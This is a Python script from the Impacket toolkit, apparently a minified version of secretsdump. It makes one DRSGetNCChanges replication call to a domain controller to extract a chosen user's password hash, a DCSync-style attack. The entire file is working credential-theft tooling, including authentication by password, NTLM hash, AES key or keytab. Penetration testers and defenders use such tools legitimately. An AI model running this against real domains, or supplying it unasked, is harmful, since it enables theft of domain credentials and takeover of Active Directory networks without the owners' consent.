#!/usr/bin/env python
# Impacket - Collection of Python classes for working with network protocols.
#
# Copyright Fortra, LLC and its affiliated companies 
#
# All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   Performs a single [MS-DRDS] DRSGetNCChanges() call
#   replicating just the attributes needed to retrieve
#   the targeted user hash.
#
#   Both targeted user and domain controler's NTDS-DSA
#   GUID are needed. This tool is not getting them.
#
# Author:
#  Alberto Solino (@agsolino) for original work
#  Paul Saladin (@p-alu) for minifying
#
# References:
#   https://github.com/fortra/impacket/blob/master/impacket/examples/secretsdump.py
#
#   """
#   Most of the work done by these guys. I just put all
#   the pieces together, plus some extra magic.
#   - https://github.com/gentilkiwi/kekeo/tree/master/dcsync
#   - https://moyix.blogspot.com.ar/2008/02/syskey-and-sam.html
#   - https://moyix.blogspot.com.ar/2008/02/decrypting-lsa-secrets.html
#   - https://moyix.blogspot.com.ar/2008/02/cached-domain-credentials.html
#   - https://web.archive.org/web/20130901115208/www.quarkslab.com/en-blog+read+13
#   - https://code.google.com/p/creddump/
#   - https://lab.mediaservice.net/code/cachedump.rb
#   - https://insecurety.net/?p=768
#   - https://web.archive.org/web/20190717124313/http://www.beginningtoseethelight.org/ntsecurity/index.htm
#   - https://www.exploit-db.com/docs/english/18244-active-domain-offline-hash-dump-&-forensic-analysis.pdf
#   - https://www.passcape.com/index.php?section=blog&cmd=details&id=15
#   """

from __future__ import division
from __future__ import print_function
import argparse
import codecs
import logging
import sys

from impacket import version
from impacket.examples import logger
from impacket.examples.utils import parse_target

from impacket.examples.getNCChanges import GetNCChanges, RemoteOperations
from impacket.krb5.keytab import Keytab

class DumpSecrets():
    def __init__(self, remoteHost, username='', password='', domain='', options=None):
        self.__remoteHost = remoteHost
        self.__remoteName = remoteHost.split('.')[0]
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = options.aesKey
        self.__doKerberos = options.k
        self.__kdcHost = options.dc_ip

        self.__userGUID = options.user_guid
        self.__NTDSDSAObjectGUID = options.dc_guid

        self.__useSAMR = options.use_samr

    def dump(self):
        try:
            self.__remoteOps = RemoteOperations(self.__doKerberos, self.__remoteHost, self.__remoteName, self.__username, self.__password,
                                                self.__domain, self.__lmhash, self.__nthash, self.__aesKey, useSAMR=self.__useSAMR, kdcHost=self.__kdcHost)
            self.__GetNCChanges = GetNCChanges(userGUID = self.__userGUID, NTDSDSAObjectGUID = self.__NTDSDSAObjectGUID, remoteOps = self.__remoteOps)
            try:
                self.__GetNCChanges.dump()
            except Exception as e:
                if logging.getLogger().level == logging.DEBUG:
                    import traceback
                    traceback.print_exc()
                logging.error(e)
                    
        except (Exception, KeyboardInterrupt) as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.error(e)

        try:
            self.cleanup()
        except:
            pass

    def cleanup(self):
        logging.info('Cleaning up... ')
        if self.__remoteOps:
            self.__remoteOps.finish()
        if self.__GetNCChanges:
            self.__GetNCChanges.finish()

# Process command-line arguments.
if __name__ == '__main__':
    # Explicitly changing the stdout encoding format
    if sys.stdout.encoding is None:
        # Output is redirected to a file
        sys.stdout = codecs.getwriter('utf8')(sys.stdout)

    print(version.BANNER)

    parser = argparse.ArgumentParser(add_help = True, description = "Performs a single GetNCChanges Operation to get the secrets of a domain user")

    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address> or LOCAL'
                                                       ' (if you want to parse local files)')
    parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('-user-guid', action='store', help='user GUID to retrieve secrets')
    parser.add_argument('-dc-guid', action='store', help='GUID of the NTDS-DSA object of the targeted DC')

    group = parser.add_argument_group('authentication')
    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
                             '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use'
                             ' the ones specified in the command line')
    group.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication'
                                                                            ' (128 or 256 bits)')
    group.add_argument('-keytab', action="store", help='Read keys for SPN from keytab file')

    group = parser.add_argument_group('connection')
    group.add_argument('-dc-ip', action='store',metavar = "ip address",  help='IP Address of the domain controller. If '
                                 'ommited it use the domain part (FQDN) specified in the target parameter')
    group.add_argument('-use-samr', action='store_true',  help='Use SAMR instead of basic DRSUAPI for communication')

    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    # Init the example's logger theme
    logger.init(options.ts)

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        # Print the Library's installation path
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)

    domain, username, password, remoteHost = parse_target(options.target)

    if options.user_guid is None or options.dc_guid is None:
        logging.error('Please provide both user GUID and DC GUID')
        sys.exit(1)
    else :
        options.user_guid = options.user_guid.replace("{", "").replace("}","")
        options.dc_guid = options.dc_guid.replace("{", "").replace("}","")
        
        if domain is None:
            domain = ''
        if options.keytab is not None:
            Keytab.loadKeysFromKeytab(options.keytab, username, domain, options)
            options.k = True
        if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
            from getpass import getpass
            password = getpass("Password:")
        if options.aesKey is not None:
            options.k = True

    dumper = DumpSecrets(remoteHost, username, password, domain, options)
    dumper.dump()